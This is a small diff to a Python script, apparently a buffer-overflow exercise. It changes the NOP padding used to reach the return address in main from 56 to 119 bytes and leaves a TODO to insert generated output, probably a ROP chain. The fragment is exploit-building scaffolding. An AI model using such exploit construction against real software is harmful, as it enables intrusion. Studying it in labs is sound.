@@ -5,7 +5,7 @@ from struct import pack
 
 # Padding goes here
 p = ''
-p += '\x90'*56 # Offset of ret in main
+p += '\x90'*119 # Offset of ret in main
 
 # TODO:
 # Insert the middle part of the generated output
